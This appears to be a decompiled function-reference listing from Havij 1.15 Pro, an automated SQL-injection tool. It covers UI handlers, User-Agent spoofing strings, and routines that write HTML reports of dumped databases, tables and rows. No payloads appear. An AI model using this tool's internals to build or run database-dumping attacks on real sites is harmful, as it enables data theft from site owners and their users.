'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
End Sub
 
Sub mnusafari_Click()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: "User-Agent"
'N  * ref: __vbaVarDup
'N  * ref: Subr_152
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarTstNe
'N  * ref: __vbaHresultCheckObj
'N  * ref: "Opera/9.23 Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.27.1 (KHTML, like Gecko) Version/3.2.1 Safari/525.27.1"
'N  * ref: __vbaStrVarVal
'N  * ref: Replace(
'N  * ref: __vbaStrMove
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrCat
'N  * ref: vbCrLf
'N  * ref: __vbaStrMove
'N  * ref: "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.27.1 (KHTML, like Gecko) Version/3.2.1 Safari/525.27.1"
'N  * ref: __vbaStrMove
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
End Sub
 
Sub mnuSelectChilds_Click()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaCastObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarForInit
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaCastObj
'N  * ref: __vbaVarForNext
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeObj
End Sub
 
Sub optFailure_Click()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeObjList
End Sub
 
Sub optSuccess_Click()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeObjList
End Sub
 
Sub picBack_MouseMove(Index as Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaFreeObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaFreeObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeObj
End Sub
 
Sub picSizeWE_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaUI1I2
End Sub
 
Sub picSizeWE_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFPException
End Sub
 
Sub picSizeWE_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaUI1I2
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaR4Var
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaR4Var
'N  * ref: __vbaR4Var
'N  * ref: __vbaFpR4
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaR4Var
'N  * ref: __vbaR4Var
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaR4Var
'N  * ref: __vbaR4Var
'N  * ref: __vbaLateIdCall
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaR4Var
'N  * ref: __vbaR4Var
'N  * ref: __vbaR4Var
'N  * ref: __vbaLateIdCall
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFPException
End Sub
 
Sub TablesTree_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeObj
End Sub
 
Sub TablesTree_NodeCheck(ByVal Node As MSComctlLib.Node)
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaObjSetAddref
'N  * ref: __vbaOnError
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarMove
'N  * ref: __vbaHresultCheckObj
'N  * ref: "."
'N  * ref: __vbaVarDup
'N  * ref: Split(
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSetAddref
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: "|"
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCat
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaVarTstNe
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaLateIdCall
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaI4Var
'N  * ref: __vbaVarForInit
'N  * ref: __vbaFreeVar
'N  * ref: __vbaI4Var
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCmp
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaVarForNext
'N  * ref: __vbaObjSet
'N  * ref: __vbaI4Var
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaBoolVar
'N  * ref: __vbaFreeVar
'N  * ref: __vbaVarCopy
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaLateIdCall
'N  * ref: __vbaFreeVar
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaVarTstNe
'N  * ref: __vbaLateIdCallSt
'N  * ref: __vbaI4Var
'N  * ref: __vbaLateIdCallSt
'N  * ref: __vbaI4Var
'N  * ref: __vbaLateIdCallSt
'N  * ref: __vbaLateIdCall
'N  * ref: __vbaStrVarCopy
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaI4Var
'N  * ref: __vbaVarForInit
'N  * ref: __vbaFreeVar
'N  * ref: __vbaI4Var
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCmp
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaVarForNext
'N  * ref: __vbaI4Var
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallSt
'N  * ref: __vbaLateIdCall
'N  * ref: __vbaExitProc
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeObj
'N  * ref: __vbaErrorOverflow
End Sub
 
Sub tlbInfo_ButtonClick(ByVal Button As MSComctlLib.Button)
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaObjSetAddref
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCmp
'N  * ref: "Get"
'N  * ref: "Stop prevoius job!"
'N  * ref: __vbaVarDup
'N  * ref: MsgBox
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: "Finding Some Information"
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: Subr_172
'N  * ref: __vbaFreeVar
'N  * ref: "Job Canceled!"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: "I'm IDLE"
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeVarList
'N  * ref: "Stop"
'N  * ref: "Canceling..."
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: "Save"
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
End Sub
 
'Sub SaveInfo()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaOnError
'N  * ref: "HTML Files|*.html;*.htm"
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeObj
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaLateIdCall
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaStrVarMove
'N  * ref: Subr_133
'N  * ref: __vbaFreeVarList
'N  * ref: "File already exists."
'N  * ref: vbCrLf
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: "Do you want to overwrite?"
'N  * ref: __vbaStrCat
'N  * ref: MsgBox
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaVarTstEq
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeVar
'N  * ref: __vbaStrMove
'N  * ref: __vbaI2I4
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrToAnsi
'N  * API ref: DeleteFileA
'N  * ref: __vbaSetSystemError
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVar
'N  * ref: __vbaNew2
'N  * ref: "info"
'N  * ref: __vbaHresultCheckObj
'N  * ref: StrConv(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCat
'N  * ref: "<a href="
'N  * ref: ">"
'N  * ref: "</a>"
'N  * ref: "%TARGET%"
'N  * ref: Replace(
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: Date
'N  * ref: Time
'N  * ref: " "
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaStrVarVal
'N  * ref: "%DATE%"
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: "Havij 1.15 Pro"
'N  * ref: "%VERSION%"
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: " (Auto Detected)"
'N  * ref: __vbaStrCat
'N  * ref: IIf(
'N  * ref: __vbaStrVarVal
'N  * ref: "%DBDETECT%"
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: "GET"
'N  * ref: __vbaVarDup
'N  * ref: "POST"
'N  * ref: __vbaVarDup
'N  * ref: IIf(
'N  * ref: __vbaStrVarVal
'N  * ref: "%METHOD%"
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarDup
'N  * ref: " (Auto Detected)"
'N  * ref: __vbaVarDup
'N  * ref: IIf(
'N  * ref: __vbaVarCat
'N  * ref: __vbaStrVarVal
'N  * ref: "%TYPE%"
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: "%INFO%"
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFileOpen
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaPut3
'N  * ref: __vbaFileClose
'N  * ref: __vbaI2I4
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaExitProc
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStr
'N  * ref: __vbaErrorOverflow
'End Sub
 
'Sub SaveTables()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaOnError
'N  * ref: "HTML Files|*.html;*.htm"
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeObj
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaLateIdCall
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaStrVarMove
'N  * ref: Subr_133
'N  * ref: __vbaFreeVarList
'N  * ref: "File already exists."
'N  * ref: vbCrLf
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: "Do you want to overwrite?"
'N  * ref: __vbaStrCat
'N  * ref: MsgBox
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaVarTstEq
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeVar
'N  * ref: __vbaI2I4
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrToAnsi
'N  * API ref: DeleteFileA
'N  * ref: __vbaSetSystemError
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVar
'N  * ref: __vbaNew2
'N  * ref: "tables"
'N  * ref: __vbaHresultCheckObj
'N  * ref: StrConv(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaNew2
'N  * ref: "rows"
'N  * ref: __vbaHresultCheckObj
'N  * ref: StrConv(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaNew2
'N  * ref: "dbhead"
'N  * ref: __vbaHresultCheckObj
'N  * ref: StrConv(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrCat
'N  * ref: "<a href="
'N  * ref: __vbaStrCat
'N  * ref: ">"
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrCat
'N  * ref: "</a>"
'N  * ref: __vbaStrCat
'N  * ref: "%TARGET%"
'N  * ref: Replace(
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: Date
'N  * ref: Time
'N  * ref: " "
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaStrVarVal
'N  * ref: "%DATE%"
'N  * ref: Replace(
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: "Havij 1.15 Pro"
'N  * ref: "%VERSION%"
'N  * ref: Replace(
'N  * ref: __vbaHresultCheckObj
'N  * ref: " (Auto Detected)"
'N  * ref: __vbaStrCat
'N  * ref: IIf(
'N  * ref: __vbaStrVarVal
'N  * ref: "%DBDETECT%"
'N  * ref: Replace(
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: "GET"
'N  * ref: __vbaVarDup
'N  * ref: "POST"
'N  * ref: __vbaVarDup
'N  * ref: IIf(
'N  * ref: __vbaStrVarVal
'N  * ref: "%METHOD%"
'N  * ref: Replace(
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarDup
'N  * ref: " (Auto Detected)"
'N  * ref: __vbaVarDup
'N  * ref: IIf(
'N  * ref: __vbaVarCat
'N  * ref: __vbaStrVarVal
'N  * ref: "%TYPE%"
'N  * ref: Replace(
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarMove
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarForInit
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjIs
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaVarAdd
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: "%DBNAME%"
'N  * ref: Replace(
'N  * ref: __vbaVarCat
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaCastObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarForInit
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaVarAdd
'N  * ref: __vbaVarCopy
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaCastObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarForInit
'N  * ref: __vbaHresultCheckObj
'N  * ref: " "
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaCastObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaVarForNext
'N  * ref: __vbaHresultCheckObj
'N  * ref: "%TABLENAME%"
'N  * ref: Replace(
'N  * ref: __vbaVarCat
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: "%COLUMNS%"
'N  * ref: __vbaStrVarVal
'N  * ref: Replace(
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaVarMod
'N  * ref: __vbaVarTstEq
'N  * ref: "%COLOR%"
'N  * ref: __vbaStrVarVal
'N  * ref: Replace(
'N  * ref: __vbaFreeStr
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaCastObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaVarForNext
'N  * ref: "</table><br>"
'N  * ref: vbCrLf
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaFreeVar
'N  * ref: __vbaVarForNext
'N  * ref: __vbaStrVarVal
'N  * ref: "%TBLS%"
'N  * ref: Replace(
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFileOpen
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVar
'N  * ref: __vbaPut3
'N  * ref: __vbaFileClose
'N  * ref: __vbaI2I4
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaExitProc
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaErrorOverflow
'End Sub
 
'Sub SaveData()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaOnError
'N  * ref: "HTML Files|*.html;*.htm"
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeObj
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaLateIdCall
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaStrVarMove
'N  * ref: Subr_133
'N  * ref: __vbaFreeVarList
'N  * ref: "File already exists."
'N  * ref: vbCrLf
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: "Do you want to overwrite?"
'N  * ref: __vbaStrCat
'N  * ref: MsgBox
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaVarTstEq
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeVar
'N  * ref: __vbaStrMove
'N  * ref: __vbaI2I4
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrToAnsi
'N  * API ref: DeleteFileA
'N  * ref: __vbaSetSystemError
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVar
'N  * ref: __vbaNew2
'N  * ref: "data"
'N  * ref: __vbaHresultCheckObj
'N  * ref: StrConv(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaNew2
'N  * ref: "headers"
'N  * ref: __vbaHresultCheckObj
'N  * ref: StrConv(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVar
'N  * ref: __vbaNew2
'N  * ref: "datarow"
'N  * ref: __vbaHresultCheckObj
'N  * ref: StrConv(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrCat
'N  * ref: "<a href="
'N  * ref: ">"
'N  * ref: "</a>"
'N  * ref: "%TARGET%"
'N  * ref: Replace(
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: Date
'N  * ref: " "
'N  * ref: Time
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaStrVarMove
'N  * ref: Subr_190
'N  * ref: "%DATE%"
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: "Havij 1.15 Pro"
'N  * ref: "%VERSION%"
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: " (Auto Detected)"
'N  * ref: __vbaStrCat
'N  * ref: IIf(
'N  * ref: __vbaStrVarVal
'N  * ref: "%DBDETECT%"
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: "GET"
'N  * ref: __vbaVarDup
'N  * ref: "POST"
'N  * ref: __vbaVarDup
'N  * ref: IIf(
'N  * ref: __vbaStrVarVal
'N  * ref: "%METHOD%"
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarDup
'N  * ref: " (Auto Detected)"
'N  * ref: __vbaVarDup
'N  * ref: IIf(
'N  * ref: __vbaVarCat
'N  * ref: __vbaStrVarVal
'N  * ref: "%TYPE%"
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: "|"
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrVarMove
'N  * ref: Split(
'N  * ref: __vbaVarIndexLoad
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: "|"
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrVarMove
'N  * ref: Split(
'N  * ref: __vbaVarIndexLoad
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: "%DATABASE%"
'N  * ref: __vbaFreeStr
'N  * ref: "%TABLE%"
'N  * ref: __vbaFreeStr
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaI4Var
'N  * ref: __vbaStrI4
'N  * ref: "%TOTALROWS%"
'N  * ref: Replace(
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaVarForInit
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaBoolVar
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaStrVarMove
'N  * ref: "%COLUMNNAME%"
'N  * ref: __vbaStrVarVal
'N  * ref: Replace(
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarForNext
'N  * ref: __vbaStrVarVal
'N  * ref: "%HEADERS%"
'N  * ref: Replace(
'N  * ref: __vbaFreeStr
'N  * ref: __vbaVarCopy
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaVarForInit
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVar
'N  * ref: __vbaVarMod
'N  * ref: __vbaVarTstEq
'N  * ref: "%COLOR%"
'N  * ref: "%COLOR%"
'N  * ref: Replace(
'N  * ref: __vbaVarMove
'N  * ref: __vbaVarCopy
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaVarForInit
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaBoolVar
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaStrVarMove
'N  * ref: Subr_190
'N  * ref: "%DATA%"
'N  * ref: __vbaStrVarVal
'N  * ref: Replace(
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarForNext
'N  * ref: "  <tr>"
'N  * ref: vbCrLf
'N  * ref: "  </tr>"
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
